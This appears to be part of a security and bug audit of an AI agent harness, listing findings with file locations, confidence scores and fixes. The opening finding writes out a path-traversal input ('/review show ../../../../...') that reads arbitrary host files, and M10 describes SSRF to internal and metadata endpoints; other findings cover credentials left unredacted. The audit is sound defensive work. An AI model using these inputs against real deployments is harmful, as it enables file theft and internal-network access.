handleReview passes the raw `rest` id into findProposal → proposalPath(home,state,'memory',id) = join(reviewDir,`${id}.md`) and skillProposalDir(home,state,id) with no sanitization. An authenticated gateway principal can run `/review show ../../../../path/to/file` to read arbitrary .md files on the host (existsSync→readFileSync→returned in output), escaping the harness home. Skills branch reads meta.json/SKILL.md from any existing dir; approve can copy from arbitrary source.  
*Fix:* Validate the proposal id against a safe-segment allowlist (e.g. ^[A-Za-z0-9_-]+$) at the top of handleReview before any findProposal lookup; reject otherwise.

**M9. redactSecrets misses channel secrets (botToken/signingSecret/authToken)** — `src/config/store.ts:11` · leak · conf 0.6  
SECRET_KEYS covers only apiKey/token. gateway.channels.{slack.botToken, slack.signingSecret, telegram.botToken, webhook.secret, sms.accountSid, sms.authToken} are schema-valid config fields but unredacted. `sov config show`, `/config show`, and `/config get gateway.channels.slack.botToken` then print Slack/Telegram bot tokens and Twilio authToken in cleartext to terminal/scrollback/bug-reports when stored in config.json.  
*Fix:* Add botToken, signingSecret, secret, accountSid, authToken to SECRET_KEYS (or redact by dotpath against the schema's secret fields), and keep them synchronized with the schema.

**M10. @url context reference has no SSRF/private-host guard** — `src/context/references.ts:121` · security · conf 0.5  
urlReference() fetches any http(s) URL from turn text with default redirect-following and no private-host check. The WebFetch tool blocks loopback/private/169.254 metadata hosts; @url (expanded in the turns route, reachable by authenticated gateway principals) does not, so it can make the server fetch internal/metadata endpoints and return the body in context.  
*Fix:* Reuse WebFetch's private-host gate (and per-hop redirect re-validation) in urlReference before fetching; return a blocked marker for private/loopback/metadata hosts.

**M11. Documented hook matcher example 'Edit|Write' can never match any tool** — `src/hooks/matcher.ts:13` · consistency · conf 0.85  
matchesHook supports only literal equality or '*'. usage.md:1983's own example uses matcher "Edit|Write" (alternation) which never equals a tool name; additionally orchestrator passes canonical names (FileEdit/FileWrite), so even literal 'Edit'/'Write'/'Read' matchers silently never fire. Users copying the docs get hooks that never run, with no warning.  
*Fix:* Support alternation/glob and tool aliases in matchesHook (like ruleMatchesTool), or fix the usage.md example to canonical literal names.

**M12. MCP connect timeout / listTools failure leaks live transport and stdio subprocess** — `src/mcp/client.ts:169` · leak · conf 0.7  
On connect timeout, connectWithTimeout rejects but the in-flight client.connect/transport is never closed — a slow-starting stdio server (e.g. cold npx download >15s) leaves an orphaned child process running for the harness process lifetime. Same for a listTools() throw after successful connect (e.g. a resources-only server without tools capability): pool catch only logs; transport never closed.  
*Fix:* In connectOne, wrap post-transport steps in try/catch and await client.close() (or transport.close()) before rethrowing; also close on timeout via an abort hook.

**M13. Server-supplied MCP tool names unvalidated; one bad name 400s every provider call** — `src/mcp/toolWrapper.ts:18` · edge · conf 0.65  
wrapMcpTool builds mcp__<alias>__<toolName> with no charset/length validation of the server-controlled toolName. Anthropic/OpenAI enforce ^[a-zA-Z0-9_-]{1,64}$ on tool names; a name with dots/spaces/unicode — or any compliant name whose prefixed form exceeds 64 chars — makes every subsequent provider request fail 400 (deferred tools still emit names), bricking the session until the server is unconfigured.  
*Fix:* At wrap time, drop (with a logged warning) tools whose composed name fails ^[a-zA-Z0-9_-]{1,64}$, or sanitize + dedupe names.

**M14. Malformed index.yaml (empty/scalar) yields null bundle.index and crashes session boot** — `src/bundle/loader.ts:35` · edge · conf 0.7  
loadBundle casts parseYaml output to BundleIndex with no shape validation. An empty index.yaml (e.g. touch ~/.harness/default-bundle/index.yaml) parses to null, so resolveProjectScope (memory/scope.ts:38 bundle.index.projectId) throws TypeError at first session. A non-string repo (array/number) throws at .trim(). Boundary trusts file content.  
*Fix:* After parse, validate index is a plain object (zod or typeof check); treat null/scalar as {} and warn.

**M15. Plugin secret-scan hard-rejects install on credential-named path env vars (false positive)** — `src/plugins/secretScan.ts:173` · bug · conf 0.6  
fieldTargetFinding flags any credential-named env/header field whose value holds a long path-like token (GOOGLE_APPLICATION_CREDENTIALS=${HOME}/key.json, API_KEY_PATH=/home/u/k). installPlugin gate 3 treats any finding as a hard reject before consent, so a legit plugin declaring an (inert-in-v1) MCP server with a credential-FILE path env var cannot be installed at all.  
*Fix:* Exempt path-shaped values (contain `/`, or start `${VAR}`/`~`) from field-targeting, or downgrade the manifest secret-scan from hard-reject to a disclosed advisory the operator can consent past.

**M16. observations.jsonl grows unbounded; collides with FileRead 1 MiB cap** — `src/learning/observer.ts:83` · perf · conf 0.6  
The observer appends to observations.jsonl forever with no rotation or cap; `learning prune` prunes only instincts. Once a busy project's file exceeds FileRead's 1 MiB cap (~3.5k observations), the synthesizer sub-agent's read of the raw path throws 'file too large', degrading or breaking synthesis exactly as the corpus accrues depth — the property the soak is meant to validate.  
*Fix:* Cap/rotate observations.jsonl (retain last N lines) or prune observations alongside instincts; have the synthesizer prompt tail recent lines via offset/limit.

**M17. Replay fixtures persist provider output and tool results unredacted (Invariant #15 bypass)** — `src/eval/replay/loader.ts:67` · leak · conf 0.6  
writeReplayFixture serializes the full capture (every StreamEvent + raw tool result data) with no redact() pass, unlike traces/trajectories which both redact at write. Fixtures are designed to be kept and committed for CI replay; a captured session that read .env or echoed a key persists the secret verbatim at the user-given path.  
*Fix:* Apply redact() to the serialized fixture in writeReplayFixture (replay never re-contacts a model, so redacted bytes still replay), or document fixtures as exempt and warn at capture time.

**M18. auth-header redaction pattern can never match at any production call site (escaped JSON)** — `src/trajectory/redact.ts:55` · leak · conf 0.7  
All three redact() call sites (trace writer, trajectory writer, router audit logger) run the patterns on JSON.stringify output, where inner quotes are escaped (\"authorization\":…), so the `"authorization"\s*:\s*"[^"]+"` pattern never fires. Non-Bearer credentials (Basic auth, unprefixed tokens) in tool inputs/outputs land unredacted in trajectory archives meant to be committed/fine-tuned.  
*Fix:* Add an escaped-quote variant, e.g. /\\"authorization\\"\s*:\s*\\"[^"\\]+\\"/gi, or run redaction per content block before the outer stringify.

**M19. Capture mode records the preflight probe as fixture turn 0 — replay desyncs by one turn** — `src/server/runtime.ts:956` · bug · conf 0.75  
CapturingProvider wraps the transport (line 956) BEFORE preflight (line 980), and preflightProvider drains provider.stream(), so a default `sov --capture-fixture f.json` records the 8-token probe as turn 0 (Ollama adds a second probe turn). Replay skips preflight entirely, so the first user turn replays the probe's reply and the session ends with a spurious 'replay exhausted'.  
*Fix:* Wrap the provider with CapturingProvider after the preflight block (mirror the tool-pool ordering), or run preflight against the unwrapped inner transport.

**M20. CredentialUnavailableError from explicit-model resolution escapes as plain-text 500** — `src/openai/routes/chatCompletions.ts:119` · bug · conf 0.85  
GET /v1/models advertises gpt-4o etc. unconditionally. A client selecting one without that provider's key configured: resolveProvider throws CredentialUnavailableError synchronously; the catch converts only InvalidModelError and re-throws the rest; no app.onError exists, so Hono returns 500 text/plain 'Internal Server Error' — no OpenAI envelope, inconsistent with the 401 invalid_api_key the same error class gets from query() via H2.  
*Fix:* In the resolution catch, route non-InvalidModelError errors through buildProviderErrorResponse(c, err) so credential errors return the 401 invalid_api_key envelope.

**M21. usage block reports only the final provider call — under-counts multi-turn tool requests** — `src/openai/routes/chatCompletions.ts:473` · bug · conf 0.75  
query() emits usage_delta per provider call (cumulative within one call, reset per turn). The non-streaming drain keeps only the LAST event, so a request that ran a tool loop (N provider calls) reports just the final call's tokens — earlier turns' input and all intermediate completion tokens are dropped. Clients doing cost tracking against OpenAI semantics (usage = whole request) get materially wrong numbers; cache-read tokens are also excluded from prompt_tokens.  
*Fix:* Accumulate per-call usage: sum each call's final inputTokens/outputTokens (detect call boundary via message_start/usage with inputTokens) instead of keeping only the last delta.

**M22. hermes.delegator.progress side-channel can never fire in production** — `src/openai/routes/chatCompletions.ts:354` · consistency · conf 0.8  
The streaming branch subscribes the per-session bus for delegator_* events, but nothing can ever publish them: the route builds ToolContext without a delegationLifecycleRecorder (only the native /turns route constructs one via synthesizeDelegationEvents), and AgentTool is stripped from the request pool by SUBAGENT_EXCLUDED_TOOLS, so no delegation can even start. The Phase-2-documented sov-serve router-progress feature is structurally dead; tests pass only by pre-seeding the bus synthetically.  
*Fix:* Either wire synthesizeDelegationEvents into the OpenAI streaming branch (and decide AgentTool pool policy), or remove the dead subscriber + docs claim.

**M23. Per-request disposeSession appends full-transcript trajectory record on every X-Session-Id reuse — O(N²) growth** — `src/openai/routes/chatCompletions.ts:553` · perf · conf 0.7  
disposeSession runs per request; disposeSessionContext loads ALL persisted messages for the session and appends a ShareGPT record. A client reusing X-Session-Id for an N-turn conversation appends N records, each a growing prefix of the same transcript: quadratic samples.jsonl growth plus N near-duplicate prefixes polluting the fine-tune corpus. TUI/cron dispose once per session; this surface disposes per request on the same row.  
*Fix:* For kind='openai-api' sessions, skip trajectory write on intermediate disposes (e.g., write only when session row is new) or dedupe/replace by sessionId.

**M24. Streaming provider failure returns HTTP 200 with clean empty stream — error invisible to clients** — `src/openai/routes/chatCompletions.ts:381` · consistency · conf 0.6  
In streaming, a provider failure before the first token (expired key, 429, bad request) is caught by query() into Terminal{reason:'error'}; translateStream collapses it to finish_reason 'stop' + [DONE]. The client receives 200 with an empty assistant message and no error signal — silent empty completions when credentials break. Non-streaming returns structured 401/429/500 for the identical failure; real OpenAI fails the HTTP request before streaming.  
*Fix:* Pull the first generator event before opening streamSSE; if the generator terminates immediately with reason 'error', return buildProviderErrorResponse instead of a 200 stream.

**M25. RouterProvider passes synthetic '<local> | <frontier>' model to child when lane model unconfigured** — `src/router/provider.ts:154` · bug · conf 0.75  
router.localModel/frontierModel are schema-optional. When unset, delegatedModel is '' so childReq keeps req.model — which in router mode is the runtime's synthetic '<localModel> | <frontierModel>' string (turns route passes runtime.model). The child transport puts req.model verbatim in the wire body, so every turn on that lane fails with model-not-found. The code comment claims 'pass empty to let the provider fill it in' — no transport does that.  
*Fix:* In runtime router wiring, default routerConfig.localModel/frontierModel to localResolved.model/frontierResolved.model so RouterProvider always has a concrete lane model.

**M26. Classifier comment promises hard escalation on context overflow but default config stays local** — `src/router/classifier.ts:44` · consistency · conf 0.6  
The context-overflow branch is documented as a 'hard frontier trigger (always escalate, regardless of escalation mode — local is structurally unable to continue)' yet returns 'local-with-escalation', which resolveLane sends back to defaultLane('local') under the default escalationMode 'ask' whenever no asker exists (server/cron/headless) or the user declines. The oversized prompt is then sent to the local model every turn, failing with context overflow instead of routing to frontier.  
*Fix:* Return 'frontier' directly from the context-overflow branch (true hard trigger), or auto-escalate that specific trigger in resolveLane regardless of mode.

**M27. OpenAI reasoning models gated ON by effort but request body uses max_tokens they reject** — `src/providers/openai.ts:164` · consistency · conf 0.65  
modelSupportsReasoning claims o1/o3/o4/gpt-5 support under apiMode 'openai', and buildKwargs attaches reasoning_effort for them. But the body always sends max_tokens (and temperature when set), which api.openai.com rejects for those exact families (requires max_completion_tokens; temperature fixed). So the only OpenAI-proper models the /effort feature targets cannot complete any request — effort or not — when a user pins defaultModel to gpt-5/o3.  
*Fix:* When modelSupportsReasoning(model,'openai'), emit max_completion_tokens instead of max_tokens and drop temperature (mirror Anthropic's dropTemperature handling).

**M28. credentials.json last-writer-wins: every markOk rewrites whole file from boot-time snapshot** — `src/providers/credentials/pool.ts:156` · bug · conf 0.55  
CredentialPool reads the full state file once at construction and persist() rewrites the entire file (all providers, all credentials) on every select/markOk/markExhausted. Long-lived processes (gateway + TUI concurrently) clobber each other: process B marks key-1 exhausted; process A's next successful turn persists its boot snapshot where key-1 is 'ok', erasing the exhaustion/usage data the file exists to share, defeating cross-process key rotation/cooldown.  
*Fix:* Re-read the file inside persist(), merge only this pool's provider/credential records, then write; or persist per-credential deltas.

**M29. 429 without parseable reset headers locks provider for 1h across all sessions** — `src/providers/credentials/rateGuard.ts:72` · edge · conf 0.5  
markRateLimited falls back to now+3600s when headers are absent/unparseable. The guard only knows x-ratelimit-reset-requests(-1h) and retry-after; OpenRouter's X-RateLimit-Reset (epoch ms) and OpenAI's duration format ('6m0s') both fail to parse. With maxSleepSeconds=600, beforeRequest then throws RateLimitGuardError for ~50 minutes (then sleeps up to 10) in every session of that provider — a single transient 429 self-inflicts an hour-long outage, with no clear-on-success path.  
*Fix:* Lower the no-header default to minutes (e.g. 60–120s with growth on repeat), and parse OpenRouter epoch-ms X-RateLimit-Reset and OpenAI duration formats.

**M30. runtime.effort documented per-session but is process-global; /effort leaks across sessions, cron, channels** — `src/server/runtime.ts:309` · consistency · conf 0.55  
The field is documented 'Per-session reasoning-depth' but lives on the shared Runtime: commandContext.setEffort mutates runtime.effort, and turns route, cron wiring, and channel pipeline all read it. On a multi-session/multi-user gateway, one principal's /effort max silently raises thinking budget (cost + latency) for every other user's turns and all cron/channel turns until restart.  
*Fix:* Store effort in per-session context (like session model overrides) keyed by sessionId; keep runtime.effort only as the boot default.

**M31. Mission .lock has no stale-lock recovery — crashed wake halts mission forever** — `src/mission/state.ts:75` · bug · conf 0.65  
acquireLock is bare mkdir with no PID/staleness check (unlike cron lockUtil and profileLock in the same repo). If a wake is SIGKILLed/power-lost mid-run, `.lock/` persists and every future runMissionWake returns {lockHeld:true} forever — an unattended launchd mission silently never wakes again until manual rmdir. Latent today (entry point missing) but pinned by tests and bites immediately once re-wired.  
*Fix:* Reuse src/cron/lockUtil.ts (tryAcquireOnce/releaseLock with PID staleness) for the mission lock.

**M32. Cron pre-agent script spawnSync blocks gateway/TUI event loop up to timeout** — `src/cron/wiring.ts:241` · perf · conf 0.7  
runScript uses spawnSync inside the cron tick, which runs in-process in the long-lived gateway/TUI/serve runtime. While a job's script runs (default timeout 120s; jobs.json scriptTimeoutMs unbounded), the entire process event loop is frozen: all HTTP/SSE streams, channel webhooks, interactive turns, and approval round-trips stall. Phase-17 choice predates the multi-user gateway hosting cron.  
*Fix:* Switch to async spawn (await exit with timeout + stdout cap), keeping the same throw-on-nonzero contract.

**M33. Stale-lock reclaim TOCTOU lets two processes hold the same cron lock** — `src/cron/lockUtil.ts:71` · bug · conf 0.5  
When two processes both judge a lock stale (dead PID, or PID file not yet written because mkdir→writeFileSync isn't atomic), A removes/recreates/owns it, then B's rmSync recursively deletes A's fresh lock and mkdirs its own — both now hold it. Two ticks then run the same due job concurrently (duplicate agent run + delivery), or two jobs.json mutations interleave causing a lost update.  
*Fix:* Reclaim via atomic rename of the stale dir to a unique name before deleting, or write PID to a temp name and create the lock dir by rename.

**M34. PID reuse after reboot makes tick lock look live — cron silently dead** — `src/cron/lockUtil.ts:66` · edge · conf 0.5  
The tick lock is held across the whole tick (minutes when an agent job runs). A crash/power-loss mid-tick leaves .tick.lock with the old PID; after reboot an unrelated live process can own that PID, so isPidAlive→true and every tick in every sov process returns false silently (the held-by-live path writes nothing to stderr). All cron jobs stop firing machine-wide until manual rm. Jobs-lock variant: recordJobRun throws post-run, so the job re-fires every tick.  
*Fix:* Add a lock mtime staleness ceiling (e.g. reclaim locks older than N hours) and/or log when the tick lock stays held across many consecutive ticks.

**M35. Cron expressions evaluated in UTC, undocumented and inconsistent with ISO schedules** — `src/cron/schedule.ts:73` · consistency · conf 0.6  
computeNextRun pins cron-kind schedules to tz UTC. A user adding `0 9 * * *` (CLI help/usage.md never mention UTC; cron-parser's own default is local tz) gets 09:00 UTC — e.g. 2 AM Pacific — and wall-clock jobs shift an hour across DST. Meanwhile ISO schedules without offset parse via Date.parse as LOCAL time, so the two schedule kinds disagree about timezone.  
*Fix:* Use local tz (drop tz option) or document UTC in `cron add` help + usage.md; pick one convention for both kinds.

**M36. Mission per-wake turn budget and agent maxTurns never enforced** — `src/cli/missionRun.ts:194` · consistency · conf 0.55  
The wake passes only userSettings.maxTurns to query(); when unset (typical) query's default of 100 turns applies. state.json perWakeTurnBudget (default 10, set via `sov mission init --per-wake-turns`) is only rendered into the prompt, and the scheduled-mission agent's frontmatter `maxTurns: 20` is ignored on this path. A looping wake can burn 100 provider turns unattended, 10x its declared budget. Latent until mission run is re-registered.  
*Fix:* Pass `maxTurns: missionFiles.state.perWakeTurnBudget` (or min with agentDef.maxTurns) to query().

**M37. Web UI follow-stream not re-pointed after compaction pivot wedges the conversation** — `src/server/webui.html:2102` · bug · conf 0.8  
On compaction_complete the webui updates S.sessionId to the child id but never reopens the ?follow SSE stream. Subsequent turns POST to /sessions/<child>/turns (child bus) while the stream stays on the parent bus, so no events render. S.turnActive stays true → UI permanently wedged (send becomes stop; can't send again).  
*Fix:* In compactionNotice, when activeSessionId differs, reset S.lastEventId=null and call stopStream()+openStream() to re-subscribe to the child id (mirrors the Go TUI's startSSE re-subscribe in app.go:765-792).

**M38. Events route misses an already-aborted request signal at attach, leaking subscriber + pinning session** — `src/server/routes/events.ts:143` · leak · conf 0.5  
The route pre-checks bus.abortSignal.aborted but has NO symmetric requestSignal.aborted pre-check. If the client disconnects during the leading `await stream.write` (before line 160), addEventListener on the already-aborted signal never fires; a ?follow loop then parks forever. The leaked subscriber keeps getSubscriberCount>0, so the supervisor never evicts the session → in-memory state leaks until restart.  
*Fix:* Add `if (requestSignal.aborted) stopped = true;` alongside the bus pre-check at line 143, before registering abortHandler.

**M39. GrepTool silently truncates output past 256KB and reports truncated:false** — `src/tools/GrepTool.ts:180` · bug · conf 0.8  
readStream caps text at MAX_OUTPUT_BYTES (256KB) but computes its `truncated` flag and never returns it (dead variable). runGrep derives `truncated` only from head_limit, so ripgrep output exceeding 256KB is silently cut (possibly mid-line) yet reported with truncated:false and summary 'N matches'. The model believes it has every match; a 'find all usages' refactor/audit on a large repo silently misses occurrences beyond the cap. Inconsistent with BashTool.readAllCapped which surfaces truncation.  
*Fix:* Return {text, truncated} from readStream and OR the byte-cap truncation into the reported truncated flag; trim to the last complete newline to avoid mid-line cuts.

**M40. emittedPrintln retains every scrollback line forever — unbounded memory growth in production** — `packages/tui/internal/app/app.go:259` · perf · conf 0.8  
drainPrintln appends every drained line to m.emittedPrintln unconditionally. Production code never reads or trims it (only tests do), so all assistant text, rendered tool cards, and — with -v — full raw tool outputs accumulate in process memory for the session lifetime. Long interactive sessions with large tool outputs grow to hundreds of MB.  
*Fix:* Gate retention behind a test-only flag (build tag or setter used by tests), or cap the slice to a small ring.

**M41. Enter during an active turn fires a second concurrent turn — interleaved output, no gating or queueing** — `packages/tui/internal/app/app.go:1174` · bug · conf 0.6  
The prompt stays live while a turn streams; Enter unconditionally POSTs /turns. The server has no turn-active guard (turns.ts returns 202 and starts a second runTurnInBackground on the same bus), so two query() loops run concurrently: text_deltas from both append into the single LiveRegion card, history saves interleave, and markTurnStart re-scopes mid-turn. Users naturally type follow-ups mid-turn.  
*Fix:* While Streaming||thinkingPending, queue the submission (send after turn_complete, Claude-Code style) or block with a dim 'turn in progress' marker.

**M42. Diff stats, AgentTool details, and DiffView dead against real wire shape** — `packages/tui/internal/components/compactline.go:209` · consistency · conf 0.75  
FileEdit/FileWrite emit "path: N replacements" text with renderHint 'diff' but no diff body, so extractDiffStats never yields "+N -M"; extractStringField(output,"summary") for AgentTool details parses a quoted string as an object and returns ""; NewDiffView(string(tr.Output)) sees escaped \n in JSON and parses zero hunks — detailed-mode diff render and Ctrl+] hunk navigation never activate. Unit tests only use synthetic JSON-object payloads.  
*Fix:* Have FileEdit/FileWrite include the unified diff in tool_result (or a dedicated wire field) and unwrap the JSON string before parsing on the Go side; align tests to real payloads.

**M43. foldOrphanLines merges words past wrap width, overflowing terminal width** — `packages/tui/internal/render/markdown.go:265` · bug · conf 0.8  
Any correctly-wrapped paragraph whose final line is one word gets that word folded into the previous line without checking it fits, producing lines wider than the wrap width — which equals the terminal width (live.SetWidth(m.width)). During streaming bubbletea truncates the over-width line (folded word invisible); committed scrollback hard-wraps at the terminal edge, mid-word, flush-left.  
*Fix:* Only fold when lipgloss.Width(prev)+1+lipgloss.Width(word) <= the render width (thread width into foldOrphanLines).

**M44. LiveRegion re-renders full markdown pipeline every 80ms spinner tick** — `packages/tui/internal/components/liveregion.go:137` · perf · conf 0.7  
View() runs glamour (new TermRenderer construction, goldmark parse, ANSI emit) plus splitSmashedTableHeader/foldOrphanLines over the entire accumulated stream buffer on every Update cycle — spinnerTickMsg fires every 80ms even with no new deltas. Cost grows linearly with response length, so long streaming responses progressively peg CPU and lag the UI near the end.  
*Fix:* Memoize the rendered string keyed on (stream length, width, theme name); recompute only when the buffer or width changed.


### LOW (33)

**L1. delegation_started fired before provider resolution — a resolveProvider throw leaves an unmatched lifecycle pair and orphan session row** — `src/runtime/scheduler.ts:291` · bug · conf 0.55  
createChildSession (l.241) and the delegation_started lifecycle event (l.261) fire before resolveProvider (l.291), which throws CredentialUnavailableError at resolve time. On throw, no delegation_completed fires: the progressEvents closure keeps a stale atomIndexByChildSessionId entry / activeDelegatorSessionId for the rest of the turn (TUI shows a never-completing atom), and an empty child session row persists. Triggerable by dispatching a role-bearing agent (e.g. /agent cheap-task) whose lane provider has no credentials.  
*Fix:* Wrap resolveProvider in the same catch as the runner (return interrupted result + fire delegation_completed success:false), or fire delegation_started after resolution.

**L2. Nested write-capable delegation stalls on global write lock for the full child timeout** — `src/runtime/scheduler.ts:221` · edge · conf 0.5  
writeLock is a runtime-global Semaphore(1) held for a child's whole run. A custom non-readOnly agent with allowedSubagents dispatching another non-readOnly agent self-blocks: the grandchild's acquire waits on the lock its ancestor holds, and the parent's query is awaiting that tool result. It only unwinds when the ancestor's per-child timeout aborts the composed signal — up to maxTurns×60s (50min) of zero progress while blocking every write-capable delegation in all sessions. Shipped bundle avoids it only because delegator is readOnly:true.  
*Fix:* Detect lock-held-by-ancestor (thread a holder token through ToolContext) and fail fast with a clear error, or skip the lock for descendants of a holder.

**L3. Telegram stop() doesn't drain in-flight poll; shutdown comment's no-DB-race claim is false** — `src/channels/adapters/telegram.ts:278` · bug · conf 0.7  
gatewayCommand.ts:271-274 stops listeners before runtime.dispose() claiming 'an in-flight poll can never race the DB close', but stop() only clearInterval()s — an in-flight pollOnce mid-turn keeps running, then saveMessage/disposeSession hit a closed SessionDb: turn lost, reply dropped, error logged. Slack/SMS scheduleBackground turns are likewise undrained at shutdown. Supervisor/CronRunner drain their in-flight work; this worker doesn't.  
*Fix:* Track the in-flight pollOnce promise; make stop() async and await it (mirror SessionSupervisor). Optionally drain scheduleBackground promises in the gateway shutdown path.

**L4. Telegram offset never confirmed at shutdown: last processed batch replays after restart** — `src/channels/adapters/telegram.ts:199` · edge · conf 0.6  
The offset cursor is process-local (`let offset = 0`) and only reaches Telegram on the NEXT getUpdates call. Updates processed in the final poll before a gateway stop/crash are never confirmed server-side, so after restart getUpdates(0) re-serves them: the user's last message gets a second full turn and a duplicate reply after every restart that follows recent traffic.  
*Fix:* On stop(), issue a fire-and-forget getUpdates(offset, timeout:0) to confirm; or persist the offset under harnessHome and seed it at construction.

**L5. SMS reply sent after STOP: background turn doesn't re-check opt-out before send** — `src/server/routes/channels.ts:457` · edge · conf 0.55  
isOptedOut is checked only before scheduling the turn. If the sender texts STOP while their prior message's turn is in flight (turns take 10-60s; STOP is handled instantly and persisted), the background task still calls transport.sendMessage when the turn completes — messaging a number after its opt-out was durably recorded. Twilio's platform-level opt-out masks this for US long codes but not universally.  
*Fix:* Inside the background task, re-check isOptedOut(runtime.harnessHome, from) immediately before transport.sendMessage and skip the send if opted out.

**L6. TUI/config launcher exit can hang or skip cleanup if teardown throws (void settle)** — `src/cli/tuiLauncher.ts:368` · bug · conf 0.5  
child.on('exit') calls `void settle(code)`; settle awaits server.stop() then runtime.dispose() before resolve(code). If either rejects (e.g. DB close error), the rejection is discarded, resolve never runs, and runTuiLauncher's promise never settles — `sov` exits via unhandled-rejection fallout instead of the child's exit code, skipping remaining cleanup. Same pattern in configMode.ts settle (line 185).  
*Fix:* Wrap stop/dispose in try/catch inside settle (log to stderr), always resolve(code). Apply to tuiLauncher.ts and configMode.ts.

**L7. sov serve port resolution retains the unchecked-port bug class the gateway fixed** — `src/main.ts:333` · consistency · conf 0.7  
Gateway hardening (v0.6.18) added resolveGatewayPort because "0 / 70000 / -1 / '8080x' silently bound a random/clamped port." `sov serve` still parses SOV_OPENAI_PORT with lenient parseInt ('8080x' silently becomes 8080), accepts 0 (binds a random port), and parsePositiveInt on --port has no 65535 upper bound — env/flag values bypass the schema's validation entirely.  
*Fix:* Reuse resolveGatewayPort (generalize to resolveServePort) for sov serve's flag/env/config precedence and range validation.

**L8. /about prints stale hardcoded version v0.0.1** — `src/commands/info.ts:15` · consistency · conf 0.85  
formatAbout (the live /about slash command) renders a hardcoded PKG_VERSION='0.0.1', so users always see 'Sovereign AI v0.0.1' regardless of the real release (0.6.37+). /health and /v1 health routes correctly import VERSION from src/version.ts; /about drifts from both reality and those surfaces.  
*Fix:* Import VERSION from src/version.ts in info.ts and use it in formatAbout instead of the local constant.

**L9. openBooleanPicker headless fallback never interpolates ${path}** — `src/commands/configOps.ts:494` · bug · conf 0.6  
On surfaces without requestPicker (e.g. `sov dispatch /config edit <boolean-path>`), the boolean editor's usage line is a single-quoted string `'set: /config set ${path} true|false'`. Single quotes mean ${path} is not interpolated (and `path` isn't even in scope here; the var is item.path). The user sees the literal text `set: /config set ${path} true|false`.  
*Fix:* Change to a backtick template: `set: /config set ${item.path} true|false`.

**L10. Leading UTF-8 BOM blocks the entire context file** — `src/context/injectionDefense.ts:22` · edge · conf 0.5  
screenContextFile rejects any text containing ﻿. A benign UTF-8 BOM at the start of an AGENTS.md/CONTEXT.md (common from some editors) blocks the whole file — its content is replaced by a [BLOCKED] placeholder with only a stderr warn, silently degrading the agent's context/instructions.  
*Fix:* Strip a single leading BOM (text.replace(/^﻿/, '')) before screening; only flag interior zero-width / bidi controls.

**L11. sov init interpolates directory name into YAML unquoted, producing a broken manifest** — `src/cli/init.ts:112` · edge · conf 0.65  
renderIndexYaml emits `repo: ${projectName}` and `title: ${projectName} README` raw. A dirname containing ': ' makes index.yaml unparseable (next sov run throws at boot); '[x]' parses repo as an array (later .trim() TypeError via scope.ts); '#' silently truncates. Also runInit overwrites an existing business/README.md without --force when index.yaml is absent.  
*Fix:* Emit YAML via the yaml package's stringify (or JSON.stringify the scalar values) instead of string templates.

**L12. Hook exit-2 with empty stderr produces empty block reason (dead fallback)** — `src/hooks/runner.ts:86` · bug · conf 0.8  
result.stderr is always a string (never undefined), so the `hook exit 2: <cmd>` fallback after `?? result.stderr ??` is unreachable. A blocking hook exiting 2 with no output yields reason '' — UserPromptSubmit surfaces Error('') with no explanation of which hook blocked.  
*Fix:* Use `result.parsed?.reason ?? (result.stderr || `hook exit 2: ${spec.command}`)`.

**L13. Default bundle system prompt advertises cost-lane sub-agents hidden in default config** — `bundle-default/business/system-prompt.md:27` · consistency · conf 0.7  
The always-injected default system prompt says cheap/moderate/frontier-task 'are available' and 'delegating via AgentTool is preferred'. With taskRouting.enabled=false (the default), computeToolVisibleAgents (runtime.ts:555) strips those roles from AgentTool's subagent_type enum, so following the prompt yields enum-validation tool errors (or the advice is silently impossible). Prompt and tool surface contradict on every default install.  
*Fix:* Move the cost-lane section into a prompt segment injected only when taskRouting is enabled (like prompts/smart-router.md).

**L14. Hook rewrittenPrompt wipes injected memory and learned-context blocks** — `src/core/query.ts:108` · bug · conf 0.6  
UserPromptSubmit hooks receive the ORIGINAL prompt text, but rewriteLatestUserText replaces the latest user message's whole first text block — which by then contains the spliced MEMORY.md and <learned-context> recall injections. Any prompt-rewriting hook silently deletes that turn's memory/recall context (the active-focus learning loop's injection).  
*Fix:* Re-apply memory/recall injection onto the rewritten prompt, or rewrite only the original-text suffix of the block.

**L15. src/bundle/README.md documents loader functions that don't exist** — `src/bundle/README.md:37` · consistency · conf 0.85  
README claims tier-1 docs are 'loaded lazily via getBusinessDoc(bundle, relPath)' and 'the loader has readBusinessDoc' as the enforcement of the read-only contract; neither function exists anywhere in src/. bundle.business Map is never populated, and tailSessionLog ignores its n parameter (returns the whole file) while README promises tail-read of last 3–5 entries.  
*Fix:* Update README to describe the actual surface (eager state load, lazy business map unused), or implement the accessor.

**L16. Nested .consent.json excluded from plugin tamper hash at any depth** — `src/plugins/integrity.ts:82` · security · conf 0.5  
hashPluginTree skips any file named .consent.json at ANY depth, not just the root record. Content under skills/x/.consent.json or commands/.consent.json is never hashed, so adding/editing it after consent does NOT set `tampered`. The S1 'tree changed since consent → reinstall' guarantee silently exempts these files, beyond the documented single root record.  
*Fix:* Exclude only the root record: skip when `relative(root, absPath) === CONSENT_FILENAME`; hash any deeper file that happens to be named .consent.json.

**L17. Trajectory writer header doc contradicts max_turns bucket behavior** — `src/trajectory/writer.ts:3` · consistency · conf 0.9  
The module header says failed.jsonl receives sessions ending via 'interrupt / error / max-turns / max-tokens', but COMPLETED_REASONS includes 'max_turns', so max_turns sessions go to samples.jsonl — and tests pin that as intended ('hit the cap cleanly'). Anyone curating fine-tune data from the header's promise mis-classifies max_turns records.  
*Fix:* Fix the header comment to list max_turns under samples.jsonl (tests establish code is the intent).

**L18. Concurrent requests sharing X-Session-Id race on shared SessionContext disposal** — `src/openai/routes/chatCompletions.ts:245` · edge · conf 0.6  
Two in-flight requests with the same X-Session-Id share one SessionContext (map keyed by sessionId). The first to finish runs disposeSession: closes the trace writer, drains the learning observer, disposes the bus while the second request still holds references in its ToolContext. Second request's trace/learning events are lost or logged as errors; its own dispose then no-ops (entry already evicted). Observability loss only — guards make subsystems best-effort.  
*Fix:* Refcount per-session contexts for openai-api sessions (dispose on last active request), or serialize requests per internalSessionId.

**L19. Schema accepts OpenAI temperature range 0–2 that Anthropic rejects (>1)** — `src/openai/mapping/schema.ts:65` · edge · conf 0.65  
temperature validates against OpenAI's 0–2 range and passes through unclamped (query → anthropic provider sends it byte-identical). For claude-* / harness-default models, a valid request with temperature 1.2 gets an upstream Anthropic 400 — and in streaming, per the silent-error collapse, an empty 200 stream with no diagnostic.  
*Fix:* Clamp temperature to the resolved provider's range (min(t,1) for anthropic) or reject >1 for claude models with a 400 invalid_request_error.

